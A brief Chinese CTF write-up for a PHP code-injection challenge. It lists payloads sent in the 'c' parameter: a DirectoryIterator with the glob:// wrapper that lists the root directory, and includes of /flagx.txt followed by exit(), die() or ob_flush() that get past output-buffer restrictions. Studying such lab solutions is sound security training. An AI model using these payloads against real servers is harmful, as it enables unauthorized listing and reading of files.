![image-20250404170438677](./assets/image-20250404170438677.png)



同上题目



### 第一种

利用glob伪协议读取根目录

```
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);?>
```

![image-20250404170503050](./assets/image-20250404170503050.png)



直接include读取

```
c=include("/flagx.txt");exit();
```

![image-20250404170534215](./assets/image-20250404170534215.png)





### 第二种

```
c=include("/flagx.txt");die();
```

![image-20250404170546528](./assets/image-20250404170546528.png)



### 第三种

```
c=include("/flagx.txt");ob_end_flush();
```

![image-20250404170619436](./assets/image-20250404170619436.png)

ob_end_flush()被禁

但是ob_flush()可用

```
c=include("/flagx.txt");ob_flush();
```

![image-20250404170634221](./assets/image-20250404170634221.png)